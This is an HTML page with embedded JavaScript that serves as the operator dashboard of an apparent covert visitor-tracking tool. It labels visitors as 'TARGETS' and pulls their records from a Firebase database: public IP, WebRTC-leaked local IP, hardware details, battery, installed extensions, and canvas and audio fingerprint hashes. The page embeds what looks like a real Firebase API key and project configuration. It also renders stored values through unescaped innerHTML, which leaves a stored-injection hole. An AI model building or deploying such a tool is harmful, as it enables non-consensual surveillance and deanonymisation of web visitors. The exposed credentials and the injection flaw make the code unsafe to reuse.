<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Console</title>
    <style>
        /* --- [ STYLE SECTION ] --- */
        body { 
            font-family: 'Courier New', monospace; 
            background-color: #050505; 
            color: #00ff41; 
            padding: 10px; 
            margin: 0;
            font-size: 14px;
        }
        h1 { 
            border-bottom: 2px solid #00ff41; 
            padding-bottom: 10px; 
            margin-bottom: 15px; 
            font-size: 1.2rem;
            word-break: break-word;
        }
        .stat-box { 
            margin-bottom: 15px; 
            border: 1px solid #333;
            padding: 8px;
            background: #111;
            font-weight: bold;
        }
        
        #log-container { 
            height: 85vh; 
            overflow-y: auto; 
            border: 1px solid #333; 
            background: #000; 
        }

        .log-entry { 
            border-bottom: 1px solid #333; 
            padding: 15px 10px; 
            margin-bottom: 5px;
        }

        /* --- THE HEADER (Date & IP) --- */
        .header-line { 
            margin-bottom: 10px; 
            color: #fff; 
            background: #1a1a1a; 
            padding: 8px; 
            border-left: 3px solid #00ff41;
            display: flex;
            flex-direction: column;
            gap: 5px;
        }
        .timestamp { color: #f60; font-weight: bold; }
        .ip-address { color: #00ff41; font-weight: bold; font-size: 1.1em;}

        /* --- THE DATA GRID --- */
        .data-group { margin-top: 10px; }
        .group-title { 
            color: #888; 
            border-bottom: 1px solid #333; 
            margin-bottom: 5px; 
            font-size: 0.8em; 
            text-transform: uppercase; 
            letter-spacing: 1px;
        }

        .data-row { 
            display: flex; 
            flex-direction: column; /* Stack on mobile for space */
            margin-bottom: 8px; 
        }

        .label { 
            color: #555; 
            font-size: 0.85em; 
            margin-bottom: 2px;
        }

        .value { 
            color: #ddd; 
            /* THIS FIXES THE TRUNCATION */
            white-space: pre-wrap; 
            word-break: break-word; 
            overflow-wrap: break-word;
            font-size: 0.95em;
        }
        
        .alert { color: #ff3333; } 
    </style>
</head>
<body>

    <h1>// GLOBAL_LOGS</h1>
    
    <div class="stat-box">
        TARGETS: <span id="visit-count" style="color:#fff">0</span>
    </div>
    
    <div id="log-container">Initializing...</div>

    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

    <script>
    document.addEventListener('DOMContentLoaded', () => {
        const firebaseConfig = {
            apiKey: "AIzaSyD19FsJIWCif0h-ExcGODrok4M7wk_bSBc",
            authDomain: "void-81e60.firebaseapp.com",
            databaseURL: "https://void-81e60-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "void-81e60",
            storageBucket: "void-81e60.appspot.com",
            messagingSenderId: "749357378719",
            appId: "1:749357378719:web:6343550759a405e5c1c6aa"
        };

        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        const container = document.getElementById('log-container');
        
        // Counter
        db.ref('engagements').on('value', snap => {
            document.getElementById('visit-count').innerText = snap.val() || 0;
        });

        // --- CUSTOM DATE FORMATTER ---
        // Desired: xth Mon. 2025, y:z am/pm
        const formatDate = (isoString) => {
            if (!isoString) return 'Unknown Time';
            const d = new Date(isoString);
            
            // Day suffix (st, nd, rd, th)
            const day = d.getDate();
            const suffix = ["th", "st", "nd", "rd"][(day % 10 > 3 || [11, 12, 13].includes(day % 100)) ? 0 : day % 10];
            
            // Month
            const month = d.toLocaleString('en-IN', { month: 'short' });
            const year = d.getFullYear();
            
            // Time
            const time = d.toLocaleString('en-IN', { hour: 'numeric', minute: 'numeric', hour12: true, timeZone: "Asia/Kolkata" });

            return `${day}${suffix} ${month}. ${year}, ${time}`;
        };

        // --- DATA STREAM ---
        db.ref('records').limitToLast(50).on('child_added', (snapshot) => {
            if(container.innerHTML.includes('Initializing')) container.innerHTML = '';

            const data = snapshot.val();
            const info = data.fullDeviceInfo || {}; // Handle new structure
            
            const entry = document.createElement('div');
            entry.className = 'log-entry';

            const row = (lbl, val) => `
                <div class="data-row">
                    <span class="label">${lbl}</span>
                    <span class="value">${val || 'N/A'}</span>
                </div>`;

            // FALLBACK LOGIC: If explicit OS is missing, show the full User Agent
            const osDisplay = (info.osPlatform && info.osPlatform !== 'Unknown') 
                ? info.osPlatform 
                : (info.userAgentOS || info.userAgent || 'N/A');

            entry.innerHTML = `
                <div class="header-line">
                    <span class="timestamp">${formatDate(data.timestamp)}</span> 
                    <span class="ip-address">IP: ${data.ip}</span>
                </div>

                <div class="data-group">
                    <div class="group-title">Network & Location</div>
                    ${row('Local IP (WebRTC)', info.localIP)}
                    ${row('Referrer', info.referrer)}
                    ${row('Connection', info.connection || info.connectionType)}
                </div>

                <div class="data-group">
                    <div class="group-title">Device & Hardware</div>
                    ${row('Operating System', osDisplay)} 
                    ${row('GPU Renderer', info.gpu || info.gpuRenderer)}
                    ${row('CPU Cores', info.cpu || info.cpuCores)}
                    ${row('RAM', info.ram)}
                    ${row('Screen Resolution', info.screen)}
                    ${row('Battery', info.battery)}
                </div>

                <div class="data-group">
                    <div class="group-title">Software Fingerprint</div>
                    ${row('Browser Engine', info.userAgent || 'N/A')}
                    ${row('Extensions', info.extensions)}
                    ${row('Canvas Hash', info.canvasHash)}
                    ${row('Audio Hash', info.audioHash)}
                </div>
            `;

            container.insertBefore(entry, container.firstChild);
        });
    });
    </script>
</body>
</html>
